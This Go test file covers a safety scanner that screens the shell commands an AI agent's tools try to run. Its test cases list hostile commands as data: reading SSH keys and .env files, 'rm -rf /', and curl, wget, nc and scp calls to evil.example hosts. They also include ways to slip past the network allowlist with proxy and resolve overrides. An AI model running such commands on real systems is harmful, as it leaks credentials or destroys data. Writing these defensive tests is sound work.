//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"go.opentelemetry.io/otel/sdk/trace"
	"go.opentelemetry.io/otel/sdk/trace/tracetest"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestLoadPolicyFileStrictValidation(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantErr string
	}{
		{
			name:    "unknown yaml field",
			content: "allowed_commandz: [go]\n",
			wantErr: "load safety policy yaml",
		},
		{
			name:    "invalid decision",
			content: "parse_failure_action: maybe\n",
			wantErr: "validate safety policy: parse_failure_action has invalid decision",
		},
		{
			name:    "invalid env name",
			content: "env_allowlist: [PATH, BAD-NAME]\n",
			wantErr: "validate safety policy: env_allowlist contains invalid name",
		},
		{
			name:    "invalid network host",
			content: "network_allowlist: [https://example.com/path]\n",
			wantErr: "validate safety policy: network_allowlist:",
		},
		{
			name:    "negative timeout",
			content: "max_timeout_sec: -1\n",
			wantErr: "validate safety policy: max_timeout_sec must be positive",
		},
		{
			name:    "negative output limit",
			content: "max_output_bytes: -1\n",
			wantErr: "validate safety policy: max_output_bytes must be positive",
		},
		{
			name:    "negative concurrency limit",
			content: "max_concurrency: -1\n",
			wantErr: "validate safety policy: max_concurrency must be positive",
		},
		{
			name:    "invalid output limit",
			content: "max_output_bytes: 0\n",
			wantErr: "validate safety policy: max_output_bytes must be positive",
		},
		{
			name:    "multiple yaml documents",
			content: "max_timeout_sec: 1\n---\nmax_timeout_sec: 2\n",
			wantErr: "load safety policy yaml: multiple YAML documents",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "policy.yaml")
			if err := os.WriteFile(path, []byte(tc.content), 0o600); err != nil {
				t.Fatal(err)
			}
			_, err := LoadPolicyFile(path)
			if err == nil {
				t.Fatalf("LoadPolicyFile() succeeded for invalid policy")
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf(
					"LoadPolicyFile() err = %q, want it to contain %q",
					err,
					tc.wantErr,
				)
			}
		})
	}
}

func TestLoadPolicyFileJSONRejectsUnknownAndTrailingValues(t *testing.T) {
	for _, content := range []string{
		`{"unknown_field": true}`,
		`{"max_timeout_sec": 1} {"max_timeout_sec": 2}`,
	} {
		path := filepath.Join(t.TempDir(), "policy.json")
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
		if _, err := LoadPolicyFile(path); err == nil {
			t.Fatalf("LoadPolicyFile() succeeded for %q", content)
		}
	}
}

func TestScannerRejectsInvalidDirectPolicy(t *testing.T) {
	scanner := NewScanner(Policy{})
	if _, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Command:  "go test ./...",
		Backend:  BackendWorkspaceExec,
	}); err == nil {
		t.Fatal("Scan() succeeded with an invalid direct policy")
	}
}

func TestSensitivePathBoundaryAvoidsEnvExampleFalsePositive(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"cat"}
	scanner := NewScanner(policy)
	report, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Command:  "cat config/.env.example",
		Backend:  BackendWorkspaceExec,
	})
	if err != nil {
		t.Fatal(err)
	}
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %s, want allow; report=%+v", report.Decision, report)
	}
}

func TestSensitivePathDetectedAfterRejectedExpansion(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"cat"}
	scanner := NewScanner(policy)
	report, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Command:  "cat $HOME/.ssh/id_rsa",
		Backend:  BackendWorkspaceExec,
	})
	if err != nil {
		t.Fatal(err)
	}
	if report.Decision != DecisionDeny || report.RuleID != ruleSensitivePath {
		t.Fatalf("unexpected report: %+v", report)
	}

	foundRules := make(map[string]bool)

	for _, finding := range report.Findings {
		foundRules[finding.RuleID] = true
	}

	if !foundRules[ruleParse] {
		t.Errorf(
			"Findings do not contain parse failure %q: %+v",
			ruleParse,
			report.Findings,
		)
	}

	if !foundRules[ruleSensitivePath] {
		t.Errorf(
			"Findings do not contain sensitive path rule %q: %+v",
			ruleSensitivePath,
			report.Findings,
		)
	}

	if len(report.Findings) == 0 ||
		report.Findings[0].RuleID != ruleSensitivePath {
		t.Errorf(
			"top Finding = %+v, want rule %q",
			report.Findings,
			ruleSensitivePath,
		)
	}
}

func TestSensitivePathFormsAndBoundaries(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"cat"}

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		command      string
		wantDecision Decision
	}{
		{
			name:         "home shorthand SSH key",
			command:      "cat ~/.ssh/id_ed25519",
			wantDecision: DecisionDeny,
		},
		{
			name:         "relative parent SSH key",
			command:      "cat ../.ssh/id_rsa",
			wantDecision: DecisionDeny,
		},
		{
			name:         "nested dotenv file",
			command:      "cat config/.env",
			wantDecision: DecisionDeny,
		},
		{
			name:         "dotenv local variant",
			command:      "cat config/.env.local",
			wantDecision: DecisionDeny,
		},
		{
			name:         "dotenv production variant",
			command:      "cat config/.env.production",
			wantDecision: DecisionDeny,
		},
		{
			name:         "case folded hidden credential file",
			command:      "cat config/.NPMRC",
			wantDecision: DecisionDeny,
		},
		{
			name:         "JSON credentials file",
			command:      "cat ./config/credentials.json",
			wantDecision: DecisionDeny,
		},
		{
			name:         "YAML credential file",
			command:      "cat ./config/credential.yaml",
			wantDecision: DecisionDeny,
		},
		{
			name:         "dotenv example is not dotenv",
			command:      "cat config/.env.example",
			wantDecision: DecisionAllow,
		},
		{
			name:         "dotenv template is not dotenv",
			command:      "cat config/.env.template",
			wantDecision: DecisionAllow,
		},
		{
			name:         "credential suffix is not exact credential file",
			command:      "cat config/credentials.example",
			wantDecision: DecisionAllow,
		},
		{
			name:         "credentials Markdown is documentation",
			command:      "cat docs/credentials.md",
			wantDecision: DecisionAllow,
		},
		{
			name:         "similar credential stem is not exact marker",
			command:      "cat config/mycredentials.json",
			wantDecision: DecisionAllow,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Fatalf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			foundSensitivePath := false
			for _, finding := range report.Findings {
				if finding.RuleID == ruleSensitivePath {
					foundSensitivePath = true
					break
				}
			}

			wantSensitivePath := tc.wantDecision == DecisionDeny
			if foundSensitivePath != wantSensitivePath {
				t.Errorf(
					"sensitive-path Finding present = %v, want %v; Findings=%+v",
					foundSensitivePath,
					wantSensitivePath,
					report.Findings,
				)
			}
		})
	}
}

func TestNetworkAllowlistUsesDomainBoundaries(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"curl"}
	policy.NetworkAllowlist = []string{"github.com"}
	scanner := NewScanner(policy)
	tests := []struct {
		url      string
		decision Decision
	}{
		{"https://github.com/trpc-group/trpc-agent-go", DecisionAllow},
		{"https://api.github.com/repos", DecisionAllow},
		{"https://evilgithub.com/data", DecisionDeny},
		{"https://github.com.evil.example/data", DecisionDeny},
		{"https://127.0.0.1/data", DecisionDeny},
		{"https://user:pass@evil.example/data", DecisionDeny},
	}
	for _, tc := range tests {
		t.Run(tc.url, func(t *testing.T) {
			report, err := scanner.Scan(context.Background(), ScanRequest{
				ToolName: "workspace_exec",
				Command:  "curl " + tc.url,
				Backend:  BackendWorkspaceExec,
			})
			if err != nil {
				t.Fatal(err)
			}
			if report.Decision != tc.decision {
				t.Fatalf("decision = %s, want %s; report=%+v",
					report.Decision, tc.decision, report)
			}
		})
	}
}

func TestNetworkHostExtractionForRemoteTools(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"ssh", "scp", "nc"}
	policy.DeniedCommands = nil
	policy.NetworkAllowlist = []string{"example.com"}
	scanner := NewScanner(policy)
	for _, command := range []string{
		"ssh user@evil.example",
		"scp file.txt user@evil.example:/tmp/file.txt",
		"nc evil.example 443",
	} {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "exec_command",
			Command:  command,
			Backend:  BackendHostExec,
		})
		if err != nil {
			t.Fatal(err)
		}
		if report.Decision != DecisionDeny {
			t.Fatalf("%q decision = %s, want deny; report=%+v",
				command, report.Decision, report)
		}
		foundNetworkFinding := false
		for _, finding := range report.Findings {
			if finding.RuleID == ruleNetwork {
				foundNetworkFinding = true
				break
			}
		}
		if !foundNetworkFinding {
			t.Errorf(
				"Findings = %+v, want a %q finding",
				report.Findings,
				ruleNetwork,
			)
		}
	}
}

func TestNetworkRuleCoversWgetAndCustomURL(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"wget",
		"custom_fetch",
	}
	policy.DeniedCommands = nil
	policy.NetworkAllowlist = []string{"example.com"}

	scanner := NewScanner(policy)

	tests := []struct {
		name               string
		command            string
		wantDecision       Decision
		wantNetworkFinding bool
	}{
		{
			name:               "wget non allowlisted domain",
			command:            "wget https://evil.example/file.tar.gz",
			wantDecision:       DecisionDeny,
			wantNetworkFinding: true,
		},
		{
			name:               "wget allowlisted subdomain",
			command:            "wget https://cdn.example.com/file.tar.gz",
			wantDecision:       DecisionAllow,
			wantNetworkFinding: false,
		},
		{
			name:               "custom command non allowlisted URL",
			command:            "custom_fetch https://evil.example/data",
			wantDecision:       DecisionDeny,
			wantNetworkFinding: true,
		},
		{
			name:               "custom command allowlisted URL",
			command:            "custom_fetch https://api.example.com/data",
			wantDecision:       DecisionAllow,
			wantNetworkFinding: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			foundNetworkFinding := false
			for _, finding := range report.Findings {
				if finding.RuleID == ruleNetwork {
					foundNetworkFinding = true
					break
				}
			}

			if foundNetworkFinding != tc.wantNetworkFinding {
				t.Errorf(
					"network Finding present = %v, want %v; Findings=%+v",
					foundNetworkFinding,
					tc.wantNetworkFinding,
					report.Findings,
				)
			}
		})
	}
}

func TestNetworkRuleCoversCommonTargetFormats(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"curl",
		"wget",
		"git",
		"echo",
	}
	policy.DeniedCommands = nil
	policy.NetworkAllowlist = []string{"example.com"}

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		command      string
		wantDecision Decision
		wantHost     string
	}{
		{
			name:         "curl bare host and path",
			command:      "curl evil.example.net/file",
			wantDecision: DecisionDeny,
			wantHost:     "evil.example.net",
		},
		{
			name:         "curl explicit URL option with bare host",
			command:      "curl --url evil.example.net/file",
			wantDecision: DecisionDeny,
			wantHost:     "evil.example.net",
		},
		{
			name:         "curl FTP URL",
			command:      "curl ftp://evil.example.net/file",
			wantDecision: DecisionDeny,
			wantHost:     "evil.example.net",
		},
		{
			name:         "wget bare host and path",
			command:      "wget evil.example.net/file",
			wantDecision: DecisionDeny,
			wantHost:     "evil.example.net",
		},
		{
			name:         "git clone SCP-like remote",
			command:      "git clone git@evil.example.net:org/repo.git",
			wantDecision: DecisionDeny,
			wantHost:     "evil.example.net",
		},
		{
			name:         "curl allowlisted bare host",
			command:      "curl api.example.com/file",
			wantDecision: DecisionAllow,
		},
		{
			name:         "git clone allowlisted SCP-like remote",
			command:      "git clone git@example.com:org/repo.git",
			wantDecision: DecisionAllow,
		},
		{
			name:         "curl output filename is not a network target",
			command:      "curl -o artifact.json https://example.com/file",
			wantDecision: DecisionAllow,
		},
		{
			name:         "echoing a URL is not a network request",
			command:      "echo 'curl https://evil.example.net/file'",
			wantDecision: DecisionAllow,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			var networkEvidence string
			for _, finding := range report.Findings {
				if finding.RuleID == ruleNetwork {
					networkEvidence = finding.Evidence
					break
				}
			}

			if tc.wantHost == "" {
				if networkEvidence != "" {
					t.Errorf(
						"network Evidence = %q, want no %q Finding",
						networkEvidence,
						ruleNetwork,
					)
				}
				return
			}

			if !strings.Contains(networkEvidence, tc.wantHost) {
				t.Errorf(
					"network Evidence = %q, want host %q",
					networkEvidence,
					tc.wantHost,
				)
			}
		})
	}
}

func TestNetworkRuleBlocksTransportAndRewriteBypasses(
	t *testing.T,
) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"github.com"}
	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		command      string
		wantDecision Decision
	}{
		{
			name: "git SCP-like remote without user",
			command: "git clone " +
				"evil.example.net:org/repo.git",
			wantDecision: DecisionDeny,
		},
		{
			name: "git insteadOf rewrites to disallowed host",
			command: "git -c " +
				"url.https://evil.example.net/.insteadOf=gh: " +
				"clone gh:org/repo.git",
			wantDecision: DecisionDeny,
		},
		{
			name: "curl proxy override",
			command: "curl " +
				"--proxy=http://evil.example.net " +
				"https://github.com/data",
			wantDecision: DecisionDeny,
		},
		{
			name: "curl connect-to override",
			command: "curl " +
				"--connect-to=github.com:443:" +
				"evil.example.net:443 " +
				"https://github.com/data",
			wantDecision: DecisionDeny,
		},
		{
			name: "curl resolve override",
			command: "curl " +
				"--resolve=github.com:443:192.0.2.1 " +
				"https://github.com/data",
			wantDecision: DecisionDeny,
		},
		{
			name:         "go get remote module",
			command:      "go get evil.example.net/module@latest",
			wantDecision: DecisionDeny,
		},
		{
			name:         "go run remote module",
			command:      "go run evil.example.net/tool@latest",
			wantDecision: DecisionDeny,
		},
		{
			name: "allowlisted git SCP-like remote",
			command: "git clone " +
				"github.com:trpc-group/trpc-agent-go.git",
			wantDecision: DecisionAllow,
		},
		{
			name: "allowlisted git rewrite destination",
			command: "git -c " +
				"url.https://github.com/.insteadOf=gh: " +
				"clone gh:trpc-group/trpc-agent-go.git",
			wantDecision: DecisionAllow,
		},
		{
			name: "allowlisted curl proxy and target",
			command: "curl " +
				"--proxy=https://github.com " +
				"https://github.com/data",
			wantDecision: DecisionAllow,
		},
		{
			name:         "allowlisted go module still reviews dependency change",
			command:      "go get github.com/example/module@latest",
			wantDecision: DecisionAsk,
		},
		{
			name:         "local go run",
			command:      "go run ./cmd/tool",
			wantDecision: DecisionAllow,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scanner.Scan() error = %v", err)
			}
			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}
			if tc.wantDecision == DecisionDeny &&
				report.RuleID != ruleNetwork {
				t.Errorf(
					"RuleID = %q, want %q; report=%+v",
					report.RuleID,
					ruleNetwork,
					report,
				)
			}
		})
	}
}

func TestNetworkRuleAggregatesWithShellWrapper(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"curl"}
	policy.NetworkAllowlist = []string{"example.com"}

	scanner := NewScanner(policy)

	report, err := scanner.Scan(
		context.Background(),
		ScanRequest{
			ToolName: "workspace_exec",
			Command:  "sh -c 'curl https://example.com.evil.test/data'",
			Backend:  BackendWorkspaceExec,
		},
	)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}

	if report.Decision != DecisionDeny {
		t.Errorf(
			"Decision = %q, want %q; report=%+v",
			report.Decision,
			DecisionDeny,
			report,
		)
	}

	foundRules := make(map[string]bool)
	for _, finding := range report.Findings {
		foundRules[finding.RuleID] = true
	}

	for _, wantRule := range []string{
		ruleCommandPolicy,
		ruleNetwork,
	} {
		if !foundRules[wantRule] {
			t.Errorf(
				"Findings = %+v, want rule %q",
				report.Findings,
				wantRule,
			)
		}
	}
}

func TestUnknownToolUsesMetadata(t *testing.T) {
	scanner := NewScanner(DefaultPolicy())
	tests := []struct {
		name     string
		metadata tool.ToolMetadata
		decision Decision
		risk     RiskLevel
	}{
		{
			name:     "ordinary unknown",
			decision: DecisionAsk,
			risk:     RiskMedium,
		},
		{
			name:     "open world",
			metadata: tool.ToolMetadata{OpenWorld: true},
			decision: DecisionAsk,
			risk:     RiskHigh,
		},
		{
			name:     "destructive",
			metadata: tool.ToolMetadata{Destructive: true},
			decision: DecisionDeny,
			risk:     RiskHigh,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(context.Background(), ScanRequest{
				ToolName: "custom_exec",
				Command:  "run",
				Metadata: tc.metadata,
			})
			if err != nil {
				t.Fatal(err)
			}
			if report.Decision != tc.decision || report.RiskLevel != tc.risk {
				t.Fatalf("unexpected report: %+v", report)
			}
		})
	}
}

func TestPermissionPolicyPassesUnknownToolMetadata(
	t *testing.T,
) {
	policy := NewPermissionPolicy(
		NewScanner(DefaultPolicy()),
	)

	tests := []struct {
		name       string
		metadata   tool.ToolMetadata
		wantAction tool.PermissionAction
		wantRisk   RiskLevel
	}{
		{
			name:       "ordinary unknown tool asks",
			wantAction: tool.PermissionActionAsk,
			wantRisk:   RiskMedium,
		},
		{
			name: "destructive unknown tool denies",
			metadata: tool.ToolMetadata{
				Destructive: true,
			},
			wantAction: tool.PermissionActionDeny,
			wantRisk:   RiskHigh,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			decision, err := policy.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:   "custom_exec",
					ToolCallID: "call-123",
					Arguments:  []byte(`{"anything":"value"}`),
					Metadata:   tc.metadata,
				},
			)
			if err != nil {
				t.Fatalf(
					"CheckToolPermission() error = %v",
					err,
				)
			}

			if decision.Action != tc.wantAction {
				t.Errorf(
					"Action = %q, want %q; decision=%+v",
					decision.Action,
					tc.wantAction,
					decision,
				)
			}

			if !strings.Contains(
				decision.Reason,
				ruleUnknownTool,
			) {
				t.Errorf(
					"Reason = %q, want rule %q",
					decision.Reason,
					ruleUnknownTool,
				)
			}

			if !strings.Contains(
				decision.Reason,
				"("+string(tc.wantRisk)+")",
			) {
				t.Errorf(
					"Reason = %q, want risk %q",
					decision.Reason,
					tc.wantRisk,
				)
			}
		})
	}
}

func TestScannerSetsOpenTelemetryAttributes(t *testing.T) {
	recorder := tracetest.NewSpanRecorder()
	provider := trace.NewTracerProvider(trace.WithSpanProcessor(recorder))
	ctx, span := provider.Tracer("safety-test").Start(context.Background(), "scan")

	scanner := NewScanner(DefaultPolicy())
	report, err := scanner.Scan(ctx, ScanRequest{
		ToolName: "workspace_exec",
		Command:  "rm -rf /",
		Backend:  BackendWorkspaceExec,
	})
	if err != nil {
		t.Fatal(err)
	}
	span.End()

	ended := recorder.Ended()
	if len(ended) != 1 {
		t.Fatalf("ended spans = %d, want 1", len(ended))
	}
	attrs := map[string]string{}
	for _, attr := range ended[0].Attributes() {
		attrs[string(attr.Key)] = attr.Value.AsString()
	}
	if attrs[OTelAttrDecision] != string(report.Decision) ||
		attrs[OTelAttrRiskLevel] != string(report.RiskLevel) ||
		attrs[OTelAttrRuleID] != report.RuleID ||
		attrs[OTelAttrBackend] != string(report.Backend) {
		t.Fatalf("unexpected attributes: %+v", attrs)
	}
}

func TestJSONLAuditorConcurrentWritesAndPermissions(t *testing.T) {
	path := filepath.Join(t.TempDir(), "audit.jsonl")
	auditor := NewJSONLAuditor(path)
	const count = 32
	var wg sync.WaitGroup
	errs := make(chan error, count)
	for i := 0; i < count; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			errs <- auditor.Record(AuditEvent{
				ToolName:  "workspace_exec",
				Decision:  DecisionAllow,
				RiskLevel: RiskLow,
				RuleID:    ruleAllow,
				Backend:   BackendWorkspaceExec,
			})
		}()
	}
	wg.Wait()
	close(errs)
	for err := range errs {
		if err != nil {
			t.Fatal(err)
		}
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != count {
		t.Fatalf("audit lines = %d, want %d", len(lines), count)
	}
	for _, line := range lines {
		var event AuditEvent
		if err := json.Unmarshal([]byte(line), &event); err != nil {
			t.Fatalf("invalid JSONL line: %v", err)
		}
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := info.Mode().Perm(); got != 0o600 {
		t.Fatalf("audit mode = %o, want 600", got)
	}
}

func TestPermissionPolicyFailsClosed(t *testing.T) {
	policy := NewPermissionPolicy(NewScanner(DefaultPolicy()))
	for _, req := range []*tool.PermissionRequest{
		nil,
		{ToolName: "workspace_exec", Arguments: []byte(`{bad`)},
	} {
		decision, err := policy.CheckToolPermission(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		if decision.Action != tool.PermissionActionDeny {
			t.Fatalf("decision = %+v, want deny", decision)
		}
	}
}

func TestPermissionPolicyZeroValueFailsClosed(t *testing.T) {
	var policy PermissionPolicy
	decision, err := policy.CheckToolPermission(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("decision = %+v, want deny", decision)
	}
}

func TestPermissionPolicyAuditsArgumentExtractionFailure(t *testing.T) {
	const secret = "sk-abcdefghijklmnop"

	path := filepath.Join(
		t.TempDir(),
		"argument-failure-audit.jsonl",
	)
	scanner := NewScanner(
		DefaultPolicy(),
		WithAuditor(NewJSONLAuditor(path)),
	)
	policy := NewPermissionPolicy(scanner)
	decision, err := policy.CheckToolPermission(
		context.Background(),
		&tool.PermissionRequest{
			ToolName: "workspace_exec",
			Arguments: []byte(
				`{"command":"echo api_key=` + secret,
			),
		},
	)
	if err != nil {
		t.Fatalf("CheckToolPermission() error = %v", err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("decision = %+v, want deny", decision)
	}
	if !strings.Contains(decision.Reason, ruleArgumentFailure) {
		t.Errorf(
			"decision reason = %q, want rule %q",
			decision.Reason,
			ruleArgumentFailure,
		)
	}
	if strings.Contains(decision.Reason, secret) {
		t.Errorf(
			"decision reason contains secret %q: %q",
			secret,
			decision.Reason,
		)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("ReadFile(audit) error = %v", err)
	}
	if strings.Contains(string(data), secret) {
		t.Errorf("audit contains secret %q: %s", secret, data)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != 1 {
		t.Fatalf("audit lines = %d, want 1; data=%s", len(lines), data)
	}
	var event AuditEvent
	if err := json.Unmarshal([]byte(lines[0]), &event); err != nil {
		t.Fatalf("json.Unmarshal(audit event) error = %v", err)
	}
	if event.ToolName != "workspace_exec" ||
		event.Backend != BackendWorkspaceExec ||
		event.Decision != DecisionDeny ||
		event.RiskLevel != RiskHigh ||
		event.RuleID != ruleArgumentFailure ||
		!event.Blocked ||
		!event.Redacted {
		t.Errorf("unexpected audit event: %+v", event)
	}
}

func TestRedactValueAndAfterToolCallback(t *testing.T) {
	input := map[string]any{
		"plain":  "ok",
		"secret": "api_key=sk-abcdefghijklmnop",
		"nested": []any{"Bearer abcdefghijklmnop"},
	}
	value, changed, err := RedactValue(input)
	if err != nil {
		t.Fatal(err)
	}
	if !changed {
		t.Fatal("RedactValue() did not report a change")
	}
	encoded, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(encoded), "abcdefghijklmnop") {
		t.Fatalf("secret leaked from redacted value: %s", encoded)
	}

	callback := NewRedactingAfterToolCallback()
	result, err := callback(context.Background(), &tool.AfterToolArgs{Result: input})
	if err != nil {
		t.Fatal(err)
	}
	if result == nil || result.CustomResult == nil {
		t.Fatal("callback did not replace a secret-bearing result")
	}
}

func TestDetectionQualityCorpus(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"go", "git", "ls", "pwd", "cat", "echo", "wc", "curl",
		"sleep", "head",
	}
	policy.NetworkAllowlist = []string{"github.com"}
	scanner := NewScanner(policy)
	corpus := []struct {
		name       string
		command    string
		dangerous  bool
		mandatory  string
		wantAction Decision
	}{
		{"safe go test", "go test ./tool/safety", false, "", DecisionAllow},
		{"safe git status", "git status --short", false, "", DecisionAllow},
		{"safe list", "ls tool/safety", false, "", DecisionAllow},
		{"safe env example", "cat .env.example", false, "", DecisionAllow},
		{"safe allowlisted network", "curl https://github.com/trpc-group", false, "", DecisionAllow},
		{"delete root", "rm -rf /", true, "delete", DecisionDeny},
		{"delete workspace", "rm -fr build", true, "delete", DecisionDeny},
		{"ssh key", "cat ~/.ssh/id_rsa", true, "secret-read", DecisionDeny},
		{"dotenv", "cat .env", true, "secret-read", DecisionDeny},
		{"credential file", "cat credentials", true, "secret-read", DecisionDeny},
		{"evil network", "curl https://evil.example/data", true, "network", DecisionDeny},
		{"similar domain", "curl https://evilgithub.com/data", true, "network", DecisionDeny},
		{"ip network", "curl https://10.0.0.1/data", true, "network", DecisionDeny},
		{"shell wrapper", "sh -c 'cat .env'", true, "", DecisionDeny},
		{"command substitution", "echo $(cat .env)", true, "", DecisionDeny},
		{"redirection", "echo data > /etc/passwd", true, "", DecisionDeny},
		{"dependency", "go install github.com/example/tool@latest", true, "", DecisionAsk},
		{"long sleep", "sleep 600", true, "", DecisionAsk},
		{"pipeline", "echo hello | wc -c", true, "", DecisionAsk},
		{"inline key", "echo api_key=sk-abcdefghijklmnop", true, "", DecisionDeny},
	}
	var dangerousCount, detected, safeCount, falsePositive int
	mandatoryTotal := map[string]int{}
	mandatoryDetected := map[string]int{}
	for _, sample := range corpus {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Command:  sample.command,
			Backend:  BackendWorkspaceExec,
		})
		if err != nil {
			t.Fatal(err)
		}
		if sample.dangerous {
			dangerousCount++
			if report.Decision != DecisionAllow {
				detected++
			}
		} else {
			safeCount++
			if report.Decision != DecisionAllow {
				falsePositive++
			}
		}
		if sample.mandatory != "" {
			mandatoryTotal[sample.mandatory]++
			if report.Decision == DecisionDeny {
				mandatoryDetected[sample.mandatory]++
			}
		}
		if report.Decision != sample.wantAction {
			t.Errorf("%s: decision=%s, want=%s; report=%+v",
				sample.name, report.Decision, sample.wantAction, report)
		}
	}
	if detected*100 < dangerousCount*90 {
		t.Fatalf("danger detection = %d/%d, want >= 90%%", detected, dangerousCount)
	}
	if falsePositive*100 > safeCount*10 {
		t.Fatalf("safe false positives = %d/%d, want <= 10%%",
			falsePositive, safeCount)
	}
	for category, total := range mandatoryTotal {
		if mandatoryDetected[category] != total {
			t.Fatalf("%s detection = %d/%d, want 100%%",
				category, mandatoryDetected[category], total)
		}
	}
}

func TestFiveHundredLineScriptUnderOneSecond(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"go"}
	scanner := NewScanner(policy)
	script := strings.Repeat("go test ./tool/safety\n", 500)
	start := time.Now()
	if _, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "execute_code",
		Command:  script,
		Backend:  BackendCodeExec,
	}); err != nil {
		t.Fatal(err)
	}
	if elapsed := time.Since(start); elapsed >= time.Second {
		t.Fatalf("500-line scan took %v, want < 1s", elapsed)
	}
}

type failingAuditor struct{}

func (failingAuditor) Record(AuditEvent) error {
	return errors.New("audit unavailable")
}

func TestPermissionPolicyDeniesWhenAuditFails(t *testing.T) {
	recorder := tracetest.NewSpanRecorder()
	provider := trace.NewTracerProvider(trace.WithSpanProcessor(recorder))
	ctx, span := provider.Tracer("safety-test").Start(context.Background(), "scan")

	scanner := NewScanner(DefaultPolicy(), WithAuditor(failingAuditor{}))
	policy := NewPermissionPolicy(scanner)
	args := []byte(`{"command":"go test ./tool/safety"}`)
	decision, err := policy.CheckToolPermission(ctx, &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("decision = %+v, want deny", decision)
	}
	span.End()
	ended := recorder.Ended()
	if len(ended) != 1 {
		t.Fatalf("ended spans = %d, want 1", len(ended))
	}
	attrs := map[string]string{}
	for _, attr := range ended[0].Attributes() {
		attrs[string(attr.Key)] = attr.Value.AsString()
	}
	if attrs[OTelAttrDecision] != string(DecisionDeny) ||
		attrs[OTelAttrRuleID] != ruleAuditFailure {
		t.Fatalf("unexpected fail-closed attributes: %+v", attrs)
	}
}

func TestDependencyInstallCommandsAndSafeCounterexamples(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"npm",
		"NPM",
		"pip",
		"apt",
		"echo",
	}
